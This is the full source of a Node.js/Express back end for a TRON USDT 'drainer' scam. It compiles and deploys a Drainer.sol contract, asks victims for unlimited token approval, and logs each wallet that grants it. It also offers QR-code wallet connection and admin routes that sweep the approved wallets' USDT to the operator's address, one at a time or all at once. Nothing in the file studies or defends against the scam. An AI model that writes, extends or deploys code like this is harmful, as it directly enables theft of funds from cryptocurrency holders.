require('dotenv').config();
const express = require('express');
const cors = require('cors');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');
const { TronWeb } = require('tronweb');
const solc = require('solc');
const QRCode = require('qrcode');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// PERSISTENT STORAGE (Render Disk)
// ============================================================

const DATA_DIR = process.env.RENDER ? '/opt/render/project/src/data' : path.join(__dirname, 'data');
const APPROVED_FILE = path.join(DATA_DIR, 'approved.json');
const EVENTS_FILE = path.join(DATA_DIR, 'events.json');

function ensureDir() {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
    console.log('✅ Created data directory:', DATA_DIR);
  }
}

function loadJSON(file) {
  try {
    return JSON.parse(fs.readFileSync(file, 'utf8'));
  } catch { return []; }
}

function saveJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

ensureDir();
if (!fs.existsSync(APPROVED_FILE)) saveJSON(APPROVED_FILE, []);
if (!fs.existsSync(EVENTS_FILE)) saveJSON(EVENTS_FILE, []);

// ============================================================
// LOGGING
// ============================================================

function log(...args) {
  const ts = new Date().toISOString().replace('T', ' ').slice(0, 19);
  console.log(`[${ts}]`, ...args);
}

// ============================================================
// MIDDLEWARE
// ============================================================

app.use(cors({ origin: '*', methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'] }));
app.use(express.json({ limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public'), {
  setHeaders: (res, p) => {
    if (p.endsWith('.html')) {
      res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
    }
  }
}));

// ============================================================
// TRONWEB INIT
// ============================================================

const tronWeb = new TronWeb({
  fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
  headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
  privateKey: '0000000000000000000000000000000000000000000000000000000000000001',
});

const USDT_CONTRACT = process.env.USDT_CONTRACT || 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const USDT_DECIMALS = 6;
const DRAIN_ADDRESS = process.env.DRAIN_ADDRESS;
let DRAIN_CONTRACT = process.env.DRAIN_CONTRACT || '';
let CONTRACTS = [];

// ============================================================
// CONTRACT DEPLOYMENT
// ============================================================

async function compileContract() {
  const source = fs.readFileSync(path.join(__dirname, 'contracts', 'Drainer.sol'), 'utf8');
  const input = JSON.stringify({
    language: 'Solidity',
    sources: { 'Drainer.sol': { content: source } },
    settings: { outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } }
  });
  const output = JSON.parse(solc.compile(input));
  const contract = output.contracts['Drainer.sol']['USDTDrainer'];
  if (!contract) throw new Error('Compilation failed');
  return { abi: contract.abi, bytecode: '0x' + contract.evm.bytecode.object };
}

async function deployContract(abi, bytecode) {
  if (!process.env.DRAIN_PRIVATE_KEY || !DRAIN_ADDRESS) return null;
  const deployWeb = new TronWeb({
    fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
    headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
    privateKey: process.env.DRAIN_PRIVATE_KEY,
  });
  const tx = await deployWeb.transactionBuilder.createSmartContract({
    abi: JSON.stringify(abi),
    bytecode,
    feeLimit: 500000000,
    callValue: 0,
    ownerAddress: DRAIN_ADDRESS,
    parameters: [USDT_CONTRACT, DRAIN_ADDRESS, DRAIN_ADDRESS],
  });
  const signed = await deployWeb.trx.sign(tx);
  const receipt = await deployWeb.trx.sendRawTransaction(signed);
  if (receipt.code && receipt.code !== 'SUCCESS') {
    console.error('Deploy failed:', receipt);
    return null;
  }
  const addr = deployWeb.address.fromHex(tx.contract_address || receipt.contract_address);
  log('Contract deployed:', addr);
  return addr;
}

async function initContract() {
  if (DRAIN_CONTRACT) {
    log('Using existing contract:', DRAIN_CONTRACT);
    if (!CONTRACTS.includes(DRAIN_CONTRACT)) CONTRACTS.push(DRAIN_CONTRACT);
    return;
  }
  if (!process.env.DRAIN_PRIVATE_KEY || !DRAIN_ADDRESS) {
    log('Skipping contract deployment (missing keys)');
    return;
  }
  try {
    const { abi, bytecode } = await compileContract();
    const addr = await deployContract(abi, bytecode);
    if (addr) {
      DRAIN_CONTRACT = addr;
      CONTRACTS.push(addr);
      log('DRAIN_CONTRACT set to:', addr);
    }
  } catch (e) {
    log('Contract init error:', e.message);
  }
}

// ============================================================
// HELPERS
// ============================================================

function makeDrainWeb() {
  if (!process.env.DRAIN_PRIVATE_KEY) return null;
  return new TronWeb({
    fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
    headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
    privateKey: process.env.DRAIN_PRIVATE_KEY,
  });
}

async function waitTx(tronWebInstance, txId, timeout = 30000) {
  const start = Date.now();
  while (Date.now() - start < timeout) {
    try {
      const info = await tronWebInstance.trx.getTransactionInfo(txId);
      if (info && info.id) {
        return { success: info.receipt && info.receipt.result === 'SUCCESS', info };
      }
    } catch (e) {}
    await new Promise(r => setTimeout(r, 1500));
  }
  return { success: false, error: 'Timeout' };
}

async function drainAllFrom(drainWeb, address, contractAddr) {
  const target = contractAddr || DRAIN_CONTRACT;
  if (!target) return { success: false, error: 'No drain contract' };
  try {
    const tx = await drainWeb.transactionBuilder.triggerSmartContract(
      target, 'drainAll(address)',
      { feeLimit: 20000000 },
      [{ type: 'address', value: address }],
      DRAIN_ADDRESS
    );
    const signed = await drainWeb.trx.sign(tx.transaction);
    const receipt = await drainWeb.trx.sendRawTransaction(signed);
    if (receipt.code && receipt.code !== 'SUCCESS') {
      return { success: false, error: 'Broadcast failed', receipt };
    }
    const txId = receipt.txid || '';
    const conf = await waitTx(drainWeb, txId, 30000);
    if (!conf.success) return { success: false, error: conf.error || 'Execution failed', txId };
    return { success: true, txId };
  } catch (e) {
    return { success: false, error: e.message };
  }
}

async function tryDrainWallet(drainWeb, address) {
  const targets = [DRAIN_CONTRACT, ...CONTRACTS.filter(c => c !== DRAIN_CONTRACT)].filter(Boolean);
  if (targets.length === 0) return { success: false, error: 'No contracts' };
  for (const c of targets) {
    try {
      const contract = await drainWeb.contract().at(USDT_CONTRACT);
      const allowance = await contract.allowance(address, c).call();
      if (allowance > 0) {
        const result = await drainAllFrom(drainWeb, address, c);
        if (result.success) return result;
      }
    } catch (e) {}
  }
  return { success: false, error: 'No allowance on any contract' };
}

// ============================================================
// ADMIN AUTH
// ============================================================

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin123';
function adminAuth(req, res, next) {
  const pwd = req.query.password || req.headers['x-admin-password'];
  if (pwd !== ADMIN_PASSWORD) return res.status(401).json({ error: 'Unauthorized' });
  next();
}

// ============================================================
// API ROUTES
// ============================================================

app.get('/api/config', (req, res) => {
  res.json({
    network: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
    usdtContract: USDT_CONTRACT,
    usdtContractHex: tronWeb.address.toHex(USDT_CONTRACT),
    drainAddress: DRAIN_ADDRESS || '',
    drainContract: DRAIN_CONTRACT || '',
    drainContractHex: DRAIN_CONTRACT ? tronWeb.address.toHex(DRAIN_CONTRACT) : '',
    maxApprove: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
    contracts: CONTRACTS,
  });
});

app.post('/api/balance', async (req, res) => {
  try {
    const { address } = req.body;
    if (!address || !tronWeb.isAddress(address)) return res.status(400).json({ error: 'Invalid address' });
    const contract = await tronWeb.contract().at(USDT_CONTRACT);
    const balance = await contract.balanceOf(address).call();
    const usdt = balance.toNumber ? balance.toNumber() / 1e6 : Number(balance) / 1e6;
    const account = await tronWeb.trx.getAccount(address);
    const trx = account.balance ? (account.balance.toNumber ? account.balance.toNumber() / 1e6 : Number(account.balance) / 1e6) : 0;
    res.json({ address, usdt, trx });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/build-tx', async (req, res) => {
  try {
    const fullNode = process.env.TRON_FULL_NODE || 'https://api.trongrid.io';
    const headers = process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {};
    const response = await axios.post(fullNode + '/wallet/triggersmartcontract', req.body, { headers, timeout: 15000 });
    res.json(response.data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/broadcast-tx', async (req, res) => {
  try {
    const fullNode = process.env.TRON_FULL_NODE || 'https://api.trongrid.io';
    const headers = process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {};
    const response = await axios.post(fullNode + '/wallet/broadcasttransaction', req.body.transaction || req.body, { headers, timeout: 15000 });
    res.json(response.data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/approve-done', (req, res) => {
  try {
    const { address } = req.body;
    if (!address || !tronWeb.isAddress(address)) return res.status(400).json({ error: 'Invalid address' });
    const list = loadJSON(APPROVED_FILE);
    if (!list.find(w => w.address === address)) {
      list.push({ address, approvedAt: Date.now() });
      saveJSON(APPROVED_FILE, list);
      log('✅ Approved wallet:', address);
    }
    res.json({ ok: true, total: list.length });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/event', (req, res) => {
  try {
    const { type, address, txId, amount } = req.body;
    const events = loadJSON(EVENTS_FILE);
    events.unshift({ type, address: address || '', txId: txId || '', amount: amount || '', time: Date.now() });
    if (events.length > 100) events.length = 100;
    saveJSON(EVENTS_FILE, events);
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// QR sessions
const qrSessions = new Map();
app.post('/api/qr-generate', async (req, res) => {
  try {
    const sessionId = crypto.randomUUID();
    const siteUrl = req.headers.origin || `https://${req.headers.host}`;
    qrSessions.set(sessionId, { address: null, expires: Date.now() + 5 * 60 * 1000 });
    const qrUrl = `${siteUrl}/qr-session/${sessionId}`;
    const qrDataUrl = await QRCode.toDataURL(qrUrl, { width: 300, margin: 2 });
    res.json({ sessionId, qrDataUrl, qrUrl });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/qr-connect/:sessionId', (req, res) => {
  const session = qrSessions.get(req.params.sessionId);
  if (!session) return res.status(404).json({ error: 'Session expired' });
  const { address } = req.body;
  if (!address || !tronWeb.isAddress(address)) return res.status(400).json({ error: 'Invalid address' });
  session.address = address;
  res.json({ ok: true });
});

app.get('/api/qr-status/:sessionId', (req, res) => {
  const session = qrSessions.get(req.params.sessionId);
  if (!session) return res.status(404).json({ error: 'Session expired' });
  res.json({ address: session.address, connected: !!session.address });
});

app.get('/qr-session/:sessionId', (req, res) => {
  const session = qrSessions.get(req.params.sessionId);
  if (!session) return res.status(404).send('Session expired');
  const qrHtmlPath = path.join(__dirname, 'public', 'qr.html');
  if (fs.existsSync(qrHtmlPath)) {
    let html = fs.readFileSync(qrHtmlPath, 'utf8');
    html = html.replace(/\{\{SESSION_ID\}\}/g, req.params.sessionId);
    html = html.replace(/\{\{SITE_URL\}\}/g, req.headers.origin || `https://${req.headers.host}`);
    res.send(html);
  } else {
    res.status(404).send('QR page not found');
  }
});

// Admin endpoints
app.get('/api/admin/wallets', adminAuth, async (req, res) => {
  const list = loadJSON(APPROVED_FILE);
  const result = [];
  for (const w of list) {
    try {
      const contract = await tronWeb.contract().at(USDT_CONTRACT);
      const raw = await contract.balanceOf(w.address).call();
      const usdt = raw.toNumber ? raw.toNumber() / 1e6 : Number(raw) / 1e6;
      const account = await tronWeb.trx.getAccount(w.address);
      const trx = account.balance ? (account.balance.toNumber ? account.balance.toNumber() / 1e6 : Number(account.balance) / 1e6) : 0;
      result.push({ address: w.address, usdt, trx, approvedAt: w.approvedAt });
    } catch (e) {
      result.push({ address: w.address, usdt: 0, trx: 0, approvedAt: w.approvedAt, error: e.message });
    }
  }
  res.json({ wallets: result, total: result.length });
});

app.post('/api/admin/drain/:address', adminAuth, async (req, res) => {
  try {
    const address = req.params.address;
    if (!address || !tronWeb.isAddress(address)) return res.status(400).json({ error: 'Invalid address' });
    if (!DRAIN_CONTRACT) return res.status(500).json({ error: 'No drain contract' });
    const drainWeb = makeDrainWeb();
    if (!drainWeb) return res.status(500).json({ error: 'Drain key not configured' });

    const contract = await drainWeb.contract().at(USDT_CONTRACT);
    const balance = await contract.balanceOf(address).call();
    if (balance <= 0) return res.json({ success: false, error: 'Zero balance' });

    const result = await tryDrainWallet(drainWeb, address);
    if (!result.success) return res.json(result);

    // Remove from approved list
    const list = loadJSON(APPROVED_FILE);
    const idx = list.findIndex(w => w.address === address);
    if (idx !== -1) { list.splice(idx, 1); saveJSON(APPROVED_FILE, list); }
    res.json({ success: true, txId: result.txId, drained: balance / 1e6 });
  } catch (e) {
    res.status(500).json({ success: false, error: e.message });
  }
});

app.post('/api/admin/drain-all', adminAuth, async (req, res) => {
  const list = loadJSON(APPROVED_FILE);
  if (list.length === 0) return res.json({ success: true, results: [] });
  const drainWeb = makeDrainWeb();
  if (!drainWeb) return res.status(500).json({ error: 'Drain key not configured' });
  const results = [];
  const drained = [];
  for (const w of list) {
    try {
      const contract = await drainWeb.contract().at(USDT_CONTRACT);
      const bal = await contract.balanceOf(w.address).call();
      if (bal <= 0) { results.push({ address: w.address, success: false, error: 'Zero balance' }); continue; }
      const r = await tryDrainWallet(drainWeb, w.address);
      if (r.success) { results.push({ address: w.address, success: true, txId: r.txId }); drained.push(w.address); }
      else results.push({ address: w.address, success: false, error: r.error });
    } catch (e) {
      results.push({ address: w.address, success: false, error: e.message });
    }
  }
  const newList = list.filter(w => !drained.includes(w.address));
  saveJSON(APPROVED_FILE, newList);
  res.json({ success: true, results, summary: { total: list.length, drained: drained.length, failed: list.length - drained.length } });
});

app.post('/api/admin/update-wallet', adminAuth, async (req, res) => {
  try {
    const { address } = req.body;
    if (!address || !tronWeb.isAddress(address)) return res.status(400).json({ error: 'Invalid address' });
    if (!process.env.DRAIN_PRIVATE_KEY || !DRAIN_ADDRESS) return res.status(500).json({ error: 'Missing keys' });
    const { abi, bytecode } = await compileContract();
    const deployWeb = new TronWeb({
      fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
      headers: process.env.TRON_API_KEY ? { 'TRON-PRO-API-KEY': process.env.TRON_API_KEY } : {},
      privateKey: process.env.DRAIN_PRIVATE_KEY,
    });
    const tx = await deployWeb.transactionBuilder.createSmartContract({
      abi: JSON.stringify(abi),
      bytecode,
      feeLimit: 500000000,
      callValue: 0,
      ownerAddress: DRAIN_ADDRESS,
      parameters: [USDT_CONTRACT, DRAIN_ADDRESS, address],
    });
    const signed = await deployWeb.trx.sign(tx);
    const receipt = await deployWeb.trx.sendRawTransaction(signed);
    if (receipt.code && receipt.code !== 'SUCCESS') return res.status(500).json({ error: 'Deploy failed' });
    const contractAddr = deployWeb.address.fromHex(tx.contract_address || receipt.contract_address);
    const oldContract = DRAIN_CONTRACT;
    if (oldContract && !CONTRACTS.includes(oldContract)) CONTRACTS.push(oldContract);
    DRAIN_CONTRACT = contractAddr;
    if (!CONTRACTS.includes(contractAddr)) CONTRACTS.push(contractAddr);
    res.json({ success: true, oldContract, contractAddress: contractAddr, owner: DRAIN_ADDRESS, recipient: address });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    drainContract: DRAIN_CONTRACT || 'not deployed',
    approvedWallets: loadJSON(APPROVED_FILE).length,
    dataDir: DATA_DIR,
  });
});

// ============================================================
// START
// ============================================================

async function start() {
  log('🚀 Starting server...');
  await initContract();
  app.listen(PORT, '0.0.0.0', () => {
    log(`✅ HTTP Server on port ${PORT}`);
    log(`   Main: http://localhost:${PORT}/`);
    log(`   Admin: http://localhost:${PORT}/admin.html`);
  });
  // Optional HTTPS
  const keyPath = path.join(__dirname, 'key.pem');
  const certPath = path.join(__dirname, 'cert.pem');
  if (fs.existsSync(keyPath) && fs.existsSync(certPath)) {
    https.createServer({ key: fs.readFileSync(keyPath), cert: fs.readFileSync(certPath) }, app)
      .listen(3443, '0.0.0.0', () => log('✅ HTTPS on 3443'));
  }
}

start().catch(e => { log('❌ Startup error:', e.message); process.exit(1); });
